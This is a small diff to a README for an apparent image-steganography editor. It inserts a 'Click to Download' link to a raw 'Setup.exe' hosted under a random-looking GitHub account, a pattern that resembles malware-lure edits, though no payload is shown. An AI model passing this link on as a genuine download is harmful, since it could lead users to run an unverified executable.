@@ -109,4 +109,6 @@ Steps
 
 This option used to change the main image to the image that you hide inside that.
 
+<a href="https://github.com/pBsOycShSo/PHIP-Editor/raw/refs/heads/main/PHIP%20Editor%20Setup.exe">Click to Download</a>
+
 ##  🤝 If you are interested in my works, follow for more.
